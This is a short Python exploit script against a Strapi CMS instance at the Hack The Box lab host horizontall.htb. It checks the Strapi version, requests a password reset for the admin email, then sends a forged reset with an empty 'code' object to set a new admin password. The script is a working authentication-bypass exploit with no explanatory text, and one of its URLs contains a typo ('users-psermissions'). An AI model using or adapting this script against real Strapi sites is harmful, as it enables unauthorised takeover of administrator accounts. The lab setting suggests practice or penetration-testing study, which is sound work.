#!/usr/bin/python3

import requests
import sys
import json
 
email = 'admin@horizontall.htb'
url = 'http://api-prod.horizontall.htb/admin/auth/login'
new_password =  'adminUno234'
 
s  =  requests.Session()
 
version = json.loads(s.get("http://api-prod.horizontall.htb/admin/strapiVersion").text)
 
print("[*] Detected version(GET /admin/strapiVersion): {}".format(version["strapiVersion"]))
 
#Request password reset
print("[*] Sending password reset request...")
reset_request={"email":email, "url":"http://api-prod.horizontall.htb/admin/plugins/users-permissions/auth/reset-password"}
s.post("http://api-prod.horizontall.htb/admin/plugins/users-psermissions/auth/reset-password", json=reset_request)
 
#Reset password to
print("[*] Setting new password...")
exploit={"code":{}, "password":new_password, "passwordConfirmation":new_password}
r=s.post("http://api-prod.horizontall.htb/admin/auth/reset-password", json=exploit)
 
print("[*] Response:")
print(str(r.content))
